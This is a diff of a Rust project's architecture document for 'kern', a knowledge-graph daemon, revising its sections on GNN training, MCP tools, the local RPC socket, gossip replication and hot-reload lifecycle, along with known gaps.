+**Where.** `src/tick/*` (2912 LoC, 7 files) + `src/tick.rs` (893 LoC).
 
-**Gaps.** `KERN_CAP_DISABLED` (no per-kern entity cap) — comment marks it
-"currently unsafe" to enable. Clustering is vector-only; no semantic/structural
-features. Naming/enrich are LLM-cold per kern.
+**Gaps.** `KERN_CAP_DISABLED` (`src/base/constants.rs:30`) — no per-kern entity
+cap; the sentinel comment marks a finite cap "currently unsafe". Clustering is
+vector-only; no semantic/structural features. Naming/enrich are LLM-cold per
+kern. Only `GnnPropagate` reports a *contained* failure today
+(`src/tick/gnn_propagate.rs:46`); every other task's early return is still
+invisible except as work that did not happen.
 
 ---
 
@@ -371,23 +450,28 @@ features. Naming/enrich are LLM-cold per kern.
 Documents are immune while Active** (immunity is revoked once superseded);
 evictions spill to the cold tier before dropping (spill-before-drop). Spill is
 lossless out of RAM, not lossless overall — the cold tier is capped at
-`COLD_MAX_ENTRIES = 50_000` and `Store::cold_cap` (`src/base/store.rs:541`)
+`COLD_MAX_ENTRIES = 50_000` and `Store::cold_cap` (`src/base/store.rs:712`)
 deletes the oldest rows past it, and with no store bound `run_gc` drops the
-victim outright (`src/tick/stigmergy.rs:56`).
+victim outright.
 
-**How.** `stigmergy::run_gc` (`src/tick/stigmergy.rs:32`) collects victims per
+**How.** `stigmergy::run_gc` (`src/tick/stigmergy.rs`) collects victims per
 kern where `is_cold_victim` holds (heat below `COLD_HEAT_THRESHOLD=0.01` *and*
-not accessed within `COLD_GC_AGE = 7 days` *and* not an Active `Fact`/`Document`,
-`src/tick/stigmergy.rs:14`), spills each
-to the cold store, and only on spill success calls `remove_entity`. A failed
-spill keeps the victim hot and retries next pass. Runs on the maintenance tick
-gated by `STIGMERGY_GC_INTERVAL = 1 hour` and clock validity.
+not accessed within `COLD_GC_AGE = 7 days` *and* not an Active `Fact`/`Document`),
+spills each to the cold store, and only on spill success calls `remove_entity`.
+A failed spill keeps the victim hot and retries next pass. Runs on the
+maintenance tick gated by `STIGMERGY_GC_INTERVAL = 1 hour` and clock validity.
+
+Past the cold cap the drop is **counted, not silent**: `cold_cap` increments
+`Store::cold_evicted` (`src/base/store.rs:752`) per deleted row and warns once
+per sweep, and `health` reports the running total on all three surfaces (MCP
+JSON, `HealthRes`, `kern health`). The bound itself is unchanged and intentional.
 
 **Where.** `src/tick/stigmergy.rs`, `src/base/reason.rs` (`remove_entity`
-cascade-deletes its edges).
+cascade-deletes its edges), `src/base/store.rs` (cap + eviction counter).
 
 **Gaps.** Victim selection is per-kern linear. No priority/age queue. Cold tier
-is brute-force search only.
+is brute-force search only, and an entity dropped past the cap is gone — the
+counter records that it happened, nothing recovers it.
 
 ---
 
@@ -399,36 +483,55 @@ Trained per-kern on the tick.
 
 **How.**
 
-- **Graph** (`src/gnn/graph.rs`) — `add_node`/`add_edge`/`add_self_loops`/
-  `normalized_adjacency` (symmetric normalized adjacency matrix as a `Tensor`),
-  `feature_matrix`.
-- **Layers** — `LinearLayer` (`src/gnn/layer.rs`), `GCNLayer`
-  (`src/gnn/gcn.rs`: linear + optional `LayerNorm` + `Activation`),
-  `LayerNorm` (`src/gnn/norm.rs`). No dropout ships.
-  Activations (`src/gnn/activation.rs`): ReLU/LeakyReLU/GELU/Sigmoid/Tanh +
-  derivatives.
-- **Model** (`src/gnn/model.rs`) — `Model::new_residual` stacks
-  `Box<dyn BackwardGraphLayer>`, `forward`/`backward`, `parameters(_mut)`,
-  `param_grads(_mut)`, `zero_grads`, `set_training`. Manual autograd via
-  `backward.rs` (`GraphLayer`/`BackwardGraphLayer` traits).
-- **Training** (`run_learned_propagation`, `src/gnn/propagate.rs:61`) — builds
+- **Graph** (`src/gnn/graph.rs`) — `add_node` (`:38`) / `add_edge` (`:50`) /
+  `add_self_loops` (`:110`) / `normalized_adjacency` (`:133`, symmetric
+  normalized adjacency matrix as a `Tensor`), `feature_matrix` (`:82`).
+- **Layers** — `LinearLayer` (`src/gnn/layer.rs:17`), `GCNLayer`
+  (`src/gnn/gcn.rs:9`: linear + optional `LayerNorm` + `Activation`),
+  `LayerNorm` (`src/gnn/norm.rs:5`). No dropout ships.
+  `Activation` (`src/gnn/activation.rs:27`) is exactly two variants — `Relu` and
+  `Sigmoid` — each with its derivative. Nothing else is implemented.
+- **Model** (`src/gnn/model.rs:9`) — `Model::new(layers, out_layer)` over a
+  `Vec<GCNLayer>` plus an optional `LinearLayer` head; `parameters(_mut)`,
+  `param_grads(_mut)`, `zero_grads`. Manual autograd via `backward.rs`
+  (`GraphLayer`/`BackwardGraphLayer` traits).
+- **Fallible forward/backward.** `Model::forward` (`src/gnn/model.rs:19`) and
+  `Model::backward` (`:30`) return `Result<_, GnnError>` and every layer call
+  inside them is a `try_` variant, so a shape or missing-forward-state error
+  propagates instead of silently zeroing. `GnnError::MissingForwardState`
+  (`src/gnn/mod.rs`) is the specific case a backward-without-forward raises.
+- **Training** (`run_learned_propagation`, `src/gnn/propagate.rs:60`) — builds
   a `GnnSnapshot` (features + positive reason edges + last weights), samples
-  negative edges, trains a 2-layer GCN (`dim → dim/2 → dim`) for
-  `DEFAULT_TRAIN_EPOCHS=24` with `Adam` (`DEFAULT_TRAIN_LEARNING_RATE=0.01`)
-  minimizing `link_prediction_loss` (sigmoid dot-product over pos/neg edges,
-  `src/gnn/loss.rs`). Output embeddings blended with input features at
-  `DEFAULT_SELF_WEIGHT=0.6`, normalized, written back as `gnn_vector`.
-  Requires `≥ DEFAULT_MIN_THOUGHTS=128` thoughts.
-- **Optimizers** (`src/gnn/optim.rs`) — `SGD` (+momentum), `Adam`.
-- **Persist** (`src/gnn/persist.rs`) — `marshal_weights`/`unmarshal_weights`/
-  `save_weights`/`load_weights` (versioned `WEIGHT_FILE_VERSION=1`).
-- **Tensor** (`src/gnn/tensor.rs`, 371 LoC) — own 2D tensor + matmul.
+  negative edges, trains a 2-layer GCN (`dim → (dim/2).clamp(16,256) → dim`) for
+  `DEFAULT_TRAIN_EPOCHS=24` with `Adam` (`DEFAULT_TRAIN_LEARNING_RATE=0.01`) on
+  the link-prediction gradient (`link_prediction_grad`, `src/gnn/loss.rs:34`;
+  `link_prediction_loss` at `:13` is the scalar form). Output embeddings blended
+  with input features at `DEFAULT_SELF_WEIGHT=0.6`, normalized, written back as
+  `gnn_vector`. Requires `≥ DEFAULT_MIN_THOUGHTS=128` thoughts. The whole
+  function returns `Result<PropagationResult, String>`: every epoch's forward and
+  backward, the inference forward, and the weight marshal are `?`-propagated, so
+  **a failed propagation writes nothing** — no half-trained embeddings, no
+  weights that produced them.
+- **Failure surfacing** (`src/tick/gnn_propagate.rs:31-47`) — on `Err` the tick
+  logs `kern.gnn` with the kern id and calls `Queue::record_task_failure`, which
+  `health` reports as `task_failures` / `last_task_failure`. Embeddings and
+  weights are left untouched.
+- **Optimizers** (`src/gnn/optim.rs`) — `Adam` (`:14`) behind an `Optimizer`
+  trait. No SGD ships.
+- **Persist** (`src/gnn/persist.rs`) — `marshal_weights` (`:52`) /
+  `unmarshal_weights` (`:69`) to and from a byte blob carried on the snapshot,
+  versioned `WEIGHT_FILE_VERSION=1` with typed `PersistError` variants for
+  version, parameter-count and per-parameter shape mismatch. There is no
+  separate weight *file* API — the blob rides the kern.
+- **Tensor** (`src/gnn/tensor.rs`) — own 2D tensor + matmul.
 
-**Where.** `src/gnn/*` (2905 LoC, 14 files). Driven by `tick::gnn_propagate::do_gnn_propagate`.
+**Where.** `src/gnn/*` (2450 LoC, 13 files). Driven by
+`tick::gnn_propagate::do_gnn_propagate`.
 
 **Gaps.** Training is synchronous on the tick (can stall a large kern). No GPU.
 Weights are per-kern, not shared across the tree. Link prediction only — no
-node-classification objective.
+node-classification objective. A repeatedly failing propagation re-enqueues
+every tick; only the climbing `task_failures` count makes that visible.
 
 ---
 
@@ -437,22 +540,23 @@ node-classification objective.
 **What.** Model Context Protocol server (stdio + HTTP/SSE) exposing the graph
 to external clients (Claude, Cursor, etc.). Protocol version `2024-11-05`.
 
-**Tools** (11, defined in `src/mcp/tools*.rs`, dispatched in `mcp.rs`
+**Tools** (12, defined in `src/mcp/tools*.rs`, dispatched in `mcp.rs`
 `call_tool`):
 
 | Tool | File | Purpose |
 | ------ | ------ | --------- |
 | `query` | `tools_query.rs` | Hybrid search + optional LLM answer. Filters: `mode`/`kind`/`source`/time range/`min_conf`/`as_of`; `include_history` for supersede chain. |
-| `ingest` | `tools_mutate.rs` | Add text. `object_id` update semantics, `descriptor` chunking. |
+| `ingest` | `tools_mutate.rs` | Add text. `object_id` update semantics, free-text `hint` chunking context (`descriptor` accepted as serde alias). |
 | `link` | `tools_mutate.rs` | Create a reason edge (LLM writes the reason if blank). |
 | `forget` | `tools_mutate.rs` | Remove a thought + cascade edges (Facts immune). |
 | `degrade` | `tools_mutate.rs` | Down-weight edges along a bad retrieval path (`DEGRADE_*` decay). |
-| `move` | `tools_mutate.rs:70` | Relocate a thought to another kern, carrying outgoing edges and restamping cross-kern references. |
-| `health` | `tools_admin.rs` | Graph stats: gravitons/kerns/entities/reasons/unnamed/descriptors. |
+| `move` | `tools_mutate.rs:377` | Relocate a thought to another kern, carrying outgoing edges and restamping cross-kern references. |
+| `health` | `tools_admin.rs:83` | Graph stats (gravitons/kerns/entities/reasons/unnamed/claim_kinds) **plus the degradation surface**: `queue_depth`, `tasks_done`, `task_avg_ms`, `task_panics`, `last_task_panic`, `task_failures`, `last_task_failure`, `cold_evicted`, `embed_model`, `embed_dim`, `embed_mismatch` (`Server::health_stats`, `src/mcp.rs`). |
 | `graviton` | `tools_admin.rs` | list/add/remove focus attractors (name + text — phrase or full document — + optional mass). Replaced the single per-kern "purpose". |
-| `descriptor` | `tools_admin.rs` | add/remove data-type descriptors. |
+| `claim_kind` | `tools_admin.rs` | register/remove claim kinds; registered kinds extend the built-in distill set. |
 | `pulse` | `tools_admin.rs` | Trigger a clustering pass across the tree. |
-| `gc` | `tools_admin.rs` | Live reap of empty/orphan kerns (`kern_gc`). |
+| `gc` | `tools_admin.rs:178` | Live reap of empty/orphan kerns (`GraphGnn::gc_empty_kerns_counted`); reports `reaped`/`before`/`after` and the live `data.mdb` size, since LMDB keeps freed pages until a restart or `kern compact`. |
+| `setup` | `tools_setup.rs` | Agent-facing installer: returns idempotent wiring instructions (seed gravitons, install the capture rule/hook in the host, verify) plus this project's current [done]/[todo] state. kern never writes host config; the calling agent does the wiring. |
 
 Plus MCP **prompts** (`src/mcp/prompt.rs`) and **resources** (`src/mcp/resources.rs`).
 
@@ -460,37 +564,54 @@ Plus MCP **prompts** (`src/mcp/prompt.rs`) and **resources** (`src/mcp/resources
 `cache`/`task_q`/`cfg`; implements `trnsprt::McpServer`. `run`/`run_stdio` use
 the trnsprt framing. `run_sse` (`src/mcp/sse.rs`) serves HTTP/SSE.
 
-**Where.** `src/mcp/*` (2213 LoC, 7 files).
+**Where.** `src/mcp/*` (2484 LoC, 8 files).
 
 **Gaps.** No streaming `answer` over stdio (SSE only). Tool schemas are hand-
 rolled JSON, not derived. No batch query. **Prompts and resources are served on
 the standalone path only.** `ProxyServer` — the path taken whenever a daemon is
 running, i.e. the normal one — implements `tools_list`/`call_tool`/
-`extra_capabilities` and no `handle_method` (`src/commands/mcp_cmd.rs:187-239`),
-so the trait default returns `None` (`src/trnsprt/src/server.rs:21-23`) and
+`extra_capabilities` and no `handle_method` (`src/commands/mcp_cmd.rs`), so the
+trait default returns `None` (`src/trnsprt/src/server.rs:21-23`) and
 `resources/list` / `prompts/list` come back `-32601` — while
-`extra_capabilities` still advertises `{"resources": {}, "prompts": {}}`
-(`:233-236`) to match standalone, which does serve them
-(`src/mcp.rs:166-186`). Advertised on the normal path, non-functional there
-(`ROADMAP.md` — "`resources/list` and `prompts/list` return `-32601` on the
-proxy path").
+`extra_capabilities` still advertises `{"resources": {}, "prompts": {}}` to match
+standalone, which does serve them (`Server::handle_method`, `src/mcp.rs`).
+Advertised on the normal path, non-functional there (`ROADMAP.md` —
+"`resources/list` and `prompts/list` return `-32601` on the proxy path").
 
 ---
 
-## 13. RPC surface (tarpc) — `active`
+## 13. RPC surface (`kern_rpc`) — `active`
 
-**What.** A `KernRpc` tarpc server over a per-cwd Unix socket for local clients
-that want the full graph API without MCP framing.
+**What.** A `KernRpc` server over a per-root local socket (Unix socket / Windows
+named pipe) for local clients that want the daemon without MCP stdio framing.
+It is the hub's control channel and the `kern mcp` proxy's data channel. There
+is **no tarpc dependency** — the service is generated by this repo's own
+`service!` macro (`src/trnsprt/macros/`) over the `typed/` channel + codec.
 
-**How.** `KernRpcHandler` (`src/rpc/kern_rpc_server.rs:17`) wraps the same
-`mcp::Server` and implements the `KernRpc` trait (122 methods + helpers, 712
-LoC). `serve_kern_rpc_loop` accepts on a `LocalListener`. The DTO/mock layer
-lives in `src/trnsprt/src/kern_rpc/{dto,mock,svc,client_local}.rs`.
+**How.** The contract is four methods, not a mirror of the tool surface
+(`src/trnsprt/src/kern_rpc/svc.rs`): `health() -> HealthRes`,
+`shutdown() -> ShutdownRes`, `call_tool(CallToolReq) -> CallToolRes`,
+`list_tools(ListToolsReq) -> ListToolsRes`. Every MCP tool reaches the daemon
+through the one `call_tool` passthrough, so the two surfaces cannot drift.
+`KernRpcHandler` (`src/rpc/kern_rpc_server.rs:11`) wraps the same `mcp::Server`;
+`health` unwraps the `health` tool's JSON envelope into the typed `HealthRes`
+(`src/trnsprt/src/kern_rpc/dto.rs`), which carries the same degradation fields
+the MCP JSON does — `task_panics`/`last_task_panic`,
+`task_failures`/`last_task_failure`, `cold_evicted`, `embed_model`/`embed_dim`/
+`embed_mismatch` — plus `idle_ms` for the hub's idle reaper. Every field is
+`#[serde(default)]`, so an older daemon reads as zeros rather than an error.
+`shutdown` fires the daemon's save-then-exit path. `serve_kern_rpc_loop`
+(`src/rpc/kern_rpc_server.rs`) accepts on a `LocalListener` and spawns a
+`Channel` per connection.
 
-**Where.** `src/rpc/*` (715 LoC), `src/trnsprt/src/kern_rpc/` (931 LoC).
+**Where.** `src/rpc/*` (195 LoC), `src/trnsprt/src/kern_rpc/`
+(`svc.rs` contract, `dto.rs` types, `client_local.rs` connect helpers).
 
-**Gaps.** tarpc pulls a heavyweight dependency; the socket has no auth. The
-trait surface mirrors MCP one-to-one (drift risk).
+**Gaps.** The socket has no auth — anything that can open the path can call
+every tool (`ROADMAP.md` — "RPC socket has no auth"). `HealthRes` is a flat
+hand-maintained DTO: a new health field has to be added in three places (the
+`health_stats` JSON, the DTO, and the `kern health` printer) or it silently
+reads as zero.
 
 ---
 
@@ -499,30 +620,38 @@ trait surface mirrors MCP one-to-one (drift risk).
 **What.** The `kern` binary. Reads the on-disk graph directly (can race a live
 daemon — prefer MCP for live state).
 
-**Subcommands** (`Commands` enum, `src/commands.rs:64`): `ingest`, `query`,
+**Subcommands** (`Commands` enum, `src/commands.rs`): `ingest`, `query`,
 `search`, `reembed`, `get`, `list`, `forget`, `link`, `health`, `profile`,
-`gc`, `compact`, `graviton {add|list|remove}`, `degrade`, `descriptor {add|rm}`,
-`peers`, `register`, `unnamed {list|promote}`, `mcp`, `compress`, `migrate`,
-`daemon`.
+`gc`, `compact`, `graviton {add|list|remove}`, `degrade`, `claim-kind {add|rm}`,
+`peers`, `register`, `unnamed {list}`, `mcp`, `compress`, `migrate`, `daemon`,
+`hub {status|resolve|unload|merge|stop}`.
 
-**How.** `dispatch` (`commands.rs:404`) routes; per-subcommand handlers in
-`src/commands/{admin,graph_ops,ingest_cmd,mcp_cmd,profile_cmd,query,reembed}.rs`.
+**How.** `dispatch` (`src/commands.rs`) routes; per-subcommand handlers in
+`src/commands/{admin,graph_ops,ingest_cmd,mcp_cmd,mcp_restart,profile_cmd,query,reembed}.rs`.
 Notable:
 
-- `reembed` (`reembed.rs`) — re-embeds every entity with a new model in batches
-  of 64, re-seeds `gnn_vector` from the raw embed, recomputes reason-edge
-  vectors (endpoint means), rebuilds the index, saves. Daemon must be stopped.
+- `reembed` (`reembed.rs`) — re-embeds every entity with a new model in batches,
+  re-seeds `gnn_vector` from the raw embed, recomputes reason-edge vectors
+  (endpoint means), rebuilds the index, saves, then re-embeds the cold tier. It
+  stamps the store with the model it actually embedded with, only after the
+  rewrite succeeded; a cold-tier failure is reported explicitly (hot graph on the
+  new model, cold tier still on the old). Daemon must be stopped.
+- `health` (`admin.rs`) — prints the graph counts plus the degradation lines:
+  cold rows evicted, an embedding-model mismatch warning, and
+  `degraded: N panics | M failures` with the most recent fault of each, printed
+  only when nonzero.
 - `profile` (`profile_cmd.rs`) — runs a query with a `Profiler` timeline.
 - `compress` (`admin.rs`) — compresses vectors with a chosen `QuantizationMode`.
 - `migrate` — legacy shard → LMDB.
-- `daemon` / `run_server` (`commands.rs:650`) — boots the full runtime: loads
-  graph, spawns watchdog, LLM keepalive, file watcher, the intake, gossip,
-  maintenance tick, MCP (stdio or SSE), and the RPC socket.
+- `daemon` / `run_server` (`src/commands.rs`) — boots the full runtime: loads
+  graph, binds the embedding model and checks the store's stamp, spawns
+  watchdog, LLM keepalive, file watcher, the intake, gossip, maintenance tick,
+  MCP (stdio or SSE), and the RPC socket.
 
-**Where.** `src/commands/*` (1859 LoC), `src/main.rs`.
+**Where.** `src/commands/*` (2459 LoC, 8 files), `src/main.rs`.
 
-**Gaps.** CLI vs daemon race is a documented footgun. No `kern status` to
-check for a running daemon. `unnamed promote` is manual.
+**Gaps.** CLI vs daemon race is a documented footgun. No `kern status` to check
+for a running daemon. `unnamed` lists only — there is no `promote`.
 
 ---
 
@@ -534,18 +663,21 @@ thought ingested on node A becomes searchable on node B under the same id.
 
 **How.**
 
-- **Node** (`src/gossip/node.rs`) — TCP listener, `Lamport` clock
-  (`bump_lamport`/`observe_lamport`), peer list (`GOSSIP_MAX_PEERS=50`),
-  `broadcast` with `GOSSIP_FANOUT=3`, `fetch_thought` RPC
-  (`GOSSIP_FETCH_TIMEOUT=5s`), `start_heartbeat`
-  (`GOSSIP_HEARTBEAT_INTERVAL=30s`), `GOSSIP_MAX_FRAME_BYTES=4MB` bounds.
+- **Node** (`src/gossip/node.rs`) — TCP listener, peer list
+  (`GOSSIP_MAX_PEERS=50`), `broadcast` with `GOSSIP_FANOUT=3`, `fetch_thought`
+  RPC (`GOSSIP_FETCH_TIMEOUT=5s`), `start_heartbeat`
+  (`GOSSIP_HEARTBEAT_INTERVAL=30s`), `GOSSIP_MAX_FRAME_BYTES=4MB` bounds. The
+  Lamport counter it stamps messages with lives on the graph, not the node
+  (`GraphGnn::bump_lamport`/`observe_lamport`, `src/base/graph.rs:443`/`:450`).
 - **Discovery** (`src/gossip/discovery.rs`) — multicast announce/parse on
-  `GOSSIP_DISCOVERY_MULTICAST=239.77.75.68:7475` every
+  `GOSSIP_DISCOVERY_MULTICAST=239.77.75.68` at `gossip.discovery_port`
+  (default `7475`, `src/config/gossip.rs:66`) every
   `GOSSIP_DISCOVERY_INTERVAL=10s`. Only pairs nodes sharing the same
   `network_id`.
-- **Handler** (`src/gossip/handler.rs`, 803 LoC) — `start_announce`,
-  `start_entity_sync` (broadcasts top-32 hottest entities every heartbeat),
-  `start_delta_flush` (drains `GraphGnn`'s pending CRDT deltas), and inbound
+- **Handler** (`src/gossip/handler.rs`) — `start_announce` (`:107`),
+  `start_entity_sync` (`:147`, broadcasts top-32 hottest entities every
+  heartbeat), `start_delta_flush` (`:191`, drains `GraphGnn`'s pending CRDT
+  deltas), and inbound
   handlers for Sphere/Question/Pulse/PeerExchange/Fetch/CrdtDelta/EntitySync.
 - **CRDTs** (`src/crdt.rs`) — `GCounter`, plus the shared `lww_wins` comparison
   the last-writer-wins call sites now route through (`join_lww_time`
@@ -567,10 +699,10 @@ thought ingested on node A becomes searchable on node B under the same id.
 **Status.** Entity-body sharing is verified on a single host with manually
 seeded `peers` (the reliable path). Multicast discovery only pairs same-
 `network_id` nodes. The **Delta, Pulse and Question senders are all live**
-(`src/gossip/handler.rs:135`, `src/commands.rs:897`, `src/commands.rs:911`,
-driven from `src/tick/tasks.rs:439`). The **fetch RPC is live**: `wire_fetch`
+(`src/gossip/handler.rs`, wired from `src/commands.rs`, driven from
+`src/tick/tasks.rs`). The **fetch RPC is live**: `wire_fetch`
 (`src/gossip/handler.rs:50`) installs the handler at startup
-(`src/commands.rs:894`) and `spawn_fetch_entity` (`src/gossip/handler.rs:71`)
+(`src/commands.rs`) and `spawn_fetch_entity` (`src/gossip/handler.rs:71`)
 issues fetches from the question path. OR-Set deltas for `statements` are
 **dead on both ends by design, not by omission**: `id == content_hash(text)`,
 so a same-id peer has identical content by construction and a differing one is
@@ -585,7 +717,8 @@ anti-entropy) is open.
 model, including what a malicious peer can and cannot do, is the `Security`
 page on the docs site (`docs/site/content/docs/concepts/security.mdx`).
 
-**Where.** `src/gossip/*` (1817 LoC, 7 files), `src/crdt.rs`, `src/base/merge.rs`.
+**Where.** `src/gossip/*` (1959 LoC, 8 files), `src/crdt.rs` (134 LoC),
+`src/base/merge.rs` (876 LoC).
 
 **Gaps.** No auth/crypto. No anti-entropy merkle/snapshot exchange — EntitySync
 ships the hottest 32 by heat per heartbeat, so cold entities may never
@@ -603,17 +736,22 @@ id (`src/gossip/handler.rs:463`).
 **What.** One client wrapping three endpoints (reason / answer / embed) against
 Ollama by default; fail-open everywhere.
 
-**How.** `Client` (`src/llm.rs:64`) — `embed`/`embed_batch` (embedding
-endpoint), `complete` (reason / distillation), `answer` (streamed answer via
-Ollama native `/api/chat`), `complete_func` (sync closure for the tick/ingest
-blocking bridges). `is_transient` classifies retryable errors. `Endpoint`
-holds url/model/key. `for_eval(seed)` makes it deterministic for benchmarks.
+**How.** `Client` (`src/llm.rs:64`) — `embed` (`:179`) / `embed_batch` (`:223`)
+against the embedding endpoint, `complete` (`:279`, reason / distillation),
+`answer` (`:335`, streamed answer via Ollama native `/api/chat`),
+`complete_func` (`:415`, sync closure for the tick/ingest blocking bridges).
+`is_transient` (`:20`) classifies retryable errors. `Endpoint` (`:47`) holds
+url/model/key; `new_embed_only` (`:171`) builds a client for `reembed`.
+`for_eval(seed)` (`:142`) makes it deterministic.
 
 **Where.** `src/llm.rs` (861 LoC).
 
 **Gaps.** Ollama-centric; OpenAI-compatible only via manual url/key. No
-embedding-dimension validation at config time (dimension locks the graph —
-`reembed` is the only escape). No retry/backoff policy object.
+retry/backoff policy object. The embedding dimension still locks the graph and
+`reembed` is the only escape — what exists now is *detection*, not prevention:
+the store stamps the model and dimension, `health` reports a mismatch, and the
+query path refuses off-dimension vectors (see §7), but nothing validates the
+configured model against the store before the first embed of a session.
 
 ---
 
@@ -621,40 +759,102 @@ embedding-dimension validation at config time (dimension locks the graph —
 
 **What.** Lightweight per-phase timing for queries and the tick.
 
-**How.** `Profiler` (`src/profile.rs`) records labeled `Checkpoint`s with
-`Instant`; `finish` produces a `Profile`; `render_timeline` draws an ASCII
-Gantt. Used by `retrieve_profiled` and the `profile` CLI.
+**How.** `Profiler` (`src/profile.rs:16`) records labeled `Checkpoint`s
+(`:4`) with `Instant`; `finish` (`:35`) produces a `Profile`; `render_timeline`
+(`:73`) draws an ASCII Gantt. Used by `retrieve_profiled` and the `profile` CLI.
 
-**Where.** `src/profile.rs` (293 LoC).
+**Where.** `src/profile.rs` (262 LoC).
 
 ---
 
 ## 18. Transport layer (`trnsprt` crate) — `active`
 
-**What.** A reusable MCP framing + multi-server registry, factored into its own
-workspace crate so other tools can embed kern as one server among many.
+**What.** MCP JSON-RPC framing plus a typed local-RPC toolkit, factored into its
+own workspace crate. Its whole public surface is what `src/trnsprt/src/lib.rs`
+re-exports: `McpError`, `serve_http`, `serve_rw`, `serve_stdio`, `McpServer`,
+`ToolResult`, `ToolSchema`, `PROTOCOL_VERSION`, the `service!` macro, and the
+`typed`/`hub_rpc`/`kern_rpc` modules.
 
 **How.**
 
-- **Transport** (`transport.rs`) — `Transport` trait, `ChildStdio::spawn`.
-- **Server** (`server.rs`) — `McpServer` trait, `serve_stdio`/`serve_rw`
-  (JSON-RPC over any reader/writer). Protocol `PROTOCOL_VERSION=2024-11-05`.
-- **Client** (`client.rs`) — `Client::initialize`/`list_tools`/`call_tool`.
-- **HTTP / InProc** (`http.rs`, `inproc.rs`) — `serve_http` (axum),
-  `InProcTransport` (server-in-process).
-- **Registry** (`registry.rs`) — `Registry` of `LiveServer`s, `spawn_stdio`/
-  `register_inproc`, aggregated `list_tools`/`call_tool` across servers.
-- **Typed** (`typed/`) — `adapter`/`channel`/`codec` for typed RPC over the
-  wire. **kern_rpc/** — DTO + mock + svc + local client for the tarpc surface.
-  **search/** — a parallel typed search service. **macros/** (`trnsprt-macros`)
-  derives boilerplate.
+- **Server** — the `McpServer` trait (`src/trnsprt/src/server.rs:9`:
+  `tools_list` and `call_tool` required; `server_name`/`server_version`/
+  `extra_capabilities`/`handle_method` defaulted) and `serve_stdio`
+  (`src/trnsprt/src/server.rs:26`) / `serve_rw` (`:34`), JSON-RPC over any
+  reader/writer. `PROTOCOL_VERSION = "2024-11-05"` (`src/trnsprt/src/lib.rs:11`).
+- **HTTP** — `serve_http` (`src/trnsprt/src/http.rs:45`, axum), optional bearer
+  token.
+- **Typed** (`src/trnsprt/src/typed/`) — the local-RPC substrate: `Adapter`
+  (`src/trnsprt/src/typed/adapter.rs:10`, plus an in-process pair),
+  `Codec`/`JsonEnvelopeCodec` (`src/trnsprt/src/typed/codec.rs:7`/`:18`),
+  `Channel` (`src/trnsprt/src/typed/channel.rs:8`), and
+  `src/trnsprt/src/typed/local.rs` — `Endpoint`
+  (`kern()`/`kern_for(root)`/`hub()`), `bind_kern_listener` (`:243`) /
+  `connect_kern` (`:211`), `LocalListener` (`:311`), and the two platform
+  adapters (`UnixStreamAdapter`, `NamedPipeAdapter`).
+- **Service macro** (`src/trnsprt/macros/`) — `service!` turns a trait of
+  `async fn`s into client + server + dispatch code. Both RPC contracts are one
+  short file each: `kern_rpc/svc.rs`, `hub_rpc/svc.rs`, with their DTOs beside
+  them.
 
-**Where.** `src/trnsprt/` (workspace member, ~2600 LoC).
+**Where.** `src/trnsprt/` (workspace member, 2298 LoC across 20 files including
+the macro crate).
 
-**Gaps.** Two parallel typed surfaces (kern_rpc + search) with overlapping DTOs.
-No connection pooling in the client.
+**Gaps.** No connection pooling in the local clients — each `connect_*` opens a
+fresh socket. There is no MCP *client* and no multi-server registry: kern is
+always the server here.
 
 ---
+
+## 18b. Lifecycle freshness — auto-restart + hot reload — `active`
+
+**What.** Two mechanisms that keep a long-lived daemon from serving stale code
+or stale config indefinitely (the 36h dead-endpoint dogfooding outage,
+2026-07-21).
+
+**How.**
+
+- **Identity** (`src/base/identity.rs`) — `build_id` = sha256 of the
+  executable's `(len, mtime)` fingerprint (path excluded: `cargo install`
+  hardlinks `target/release`; semver excluded: every dev build reports the
+  same version), `config_id` = sha256 of the serialized resolved config,
+  `uptime_ms` stamped at bootstrap. All three ride `HealthRes` (append-only,
+  empty/0 from older daemons).
+- **Client-side auto-restart** (`src/commands/mcp_restart.rs`, applied in
+  `mcp_cmd.rs` `replace_if_stale`) — on attach, `kern mcp` compares identities.
+  Verdict is a pure tested function: `Fresh` proxies; `Stale` (differs AND
+  daemon uptime ≥ 15s) triggers graceful `shutdown` → socket-release wait →
+  respawn → reattach; `Hold` (young daemon, empty ids, or unreadable self)
+  warns and proxies — unknown is never stale, and the 15s floor stops two
+  differing builds restarting each other in a loop. `[hub] auto_restart`
+  (default true) gates the restart, never the warning. Fail open at every
+  step: an unreachable health, failed shutdown, or failed respawn falls back
+  to proxying.
+- **Hot reload** (`src/takeover.rs`, Unix only, `[reload] enabled` default
+  true, `poll_secs` default 3) — the daemon polls its own binary path
+  (deleted-marker-stripped); a changed fingerprint must survive two
+  consecutive polls (torn mid-link file never fires). Trigger reuses the
+  graceful shutdown path (drain, guarded flush), then spawns the successor
+  with the listening socket dup'd in as fd 0 (`Stdio::from(OwnedFd)` — dup2
+  clears CLOEXEC, no libc dep) with `KERN_TAKEOVER=1`, and `process::exit(0)`s
+  — deliberately skipping `LocalListener`'s Drop, which would unlink the
+  socket path under the successor's fd. The successor adopts fd 0
+  (`trnsprt adopt_kern_listener`), skips bind, AlreadyRunning probe (would
+  eat a queued connect) and store self-heal (predecessor still holds the env
+  for ms). Connects during successor boot queue in the kernel backlog; the
+  MCP proxy reconnects severed connections and retries the call once
+  (idempotent: ingest is content-addressed, queries are reads). Measured
+  handover on the dogfood store: 39ms listener gap, zero refused connects.
+- **Windows** — no fd handoff for named pipes; client-side auto-restart is
+  the coverage there.
+
+**Gaps.**
+
+- Hub-tracked nodes: after a takeover the hub's `NodeHandle` holds the dead
+  predecessor's PID; the reaper drops it and the next resolve re-adopts via
+  probe — eventual, not immediate.
+- The queued-job loss window on reload equals the existing Ctrl-C graceful
+  path (RAM-only fallback enqueues); durable intake files survive by design.
 
 ## 18a. Hub — machine-level control plane — `active`
 
@@ -667,12 +867,16 @@ client→node — the hub is connect-time only, never a proxy hop.
 
 **How.**
 
-- **hub_rpc** (`trnsprt/src/hub_rpc/`) — `resolve(root)` / `status` / `unload`
-  service + `connect_hub` client. `Endpoint::hub()` (machine-scoped),
-  `Endpoint::kern_for(root)` (hub computes a node's socket without chdir).
-- **Supervisor** (`src/hub/`) — `node.rs` spawn/probe/ready-wait/shutdown,
-  `serve.rs` handler + accept loop + dead-node reaper. Hub exit leaves nodes
-  running; a restarted hub re-adopts them via probe.
+- **hub_rpc** (`src/trnsprt/src/hub_rpc/`) — a four-method service
+  (`svc.rs`): `resolve(ResolveReq)`, `status()`, `unload(UnloadReq)`, `stop()`,
+  plus a `connect_hub` client (`client.rs:11`). `Endpoint::hub()`
+  (machine-scoped), `Endpoint::kern_for(root)` (hub computes a node's socket
